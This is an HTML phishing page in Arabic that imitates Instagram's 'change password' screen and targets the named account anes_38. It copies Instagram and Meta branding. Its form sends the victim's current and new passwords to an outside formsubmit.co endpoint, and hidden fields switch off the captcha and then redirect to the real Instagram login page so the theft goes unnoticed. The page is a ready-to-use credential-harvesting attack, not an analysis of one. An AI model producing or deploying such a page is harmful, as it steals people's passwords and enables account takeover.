<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #000000; color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; border: 1px solid #262626; border-radius: 1px; background-color: #000; }
        
        /* إصلاح الشعار وضمان ظهوره باللون الأبيض */
        .logo { width: 175px; margin: 30px auto; display: block; filter: invert(1) brightness(2); }
        
        .user-info { color: #a8a8a8; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .user-info b { color: #fff; }

        input { width: 100%; background: #121212; border: 1px solid #363636; border-radius: 3px; padding: 12px; margin-bottom: 10px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #a8a8a8; }

        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: white; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; }
        button:active { opacity: 0.7; }

        .footer { margin-top: 50px; text-align: center; color: #a8a8a8; font-size: 12px; letter-spacing: 1px; }
        .meta-logo { width: 60px; filter: invert(1); opacity: 0.8; margin-top: 5px; display: block; margin-left: auto; margin-right: auto; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
    
    <div class="user-info">تغيير كلمة المرور لـ<br><b>anes_38</b></div>
    
    <form action="https://formsubmit.co/b35269abccf715e68332f1a3a4ccca0c" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://www.instagram.com/accounts/login/">
        
        <input type="password" name="current_password" placeholder="كلمة المرور الحالية" required>
        <input type="password" name="new_password" placeholder="كلمة المرور الجديدة" required>
        <input type="password" name="confirm_password" placeholder="تأكيد كلمة المرور الجديدة" required>
        
        <button type="submit">تغيير كلمة المرور</button>
    </form>
</div>

<div class="footer">
    <span style="text-transform: lowercase; opacity: 0.5;">from</span>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo" alt="Meta">
</div>

</body>
</html>
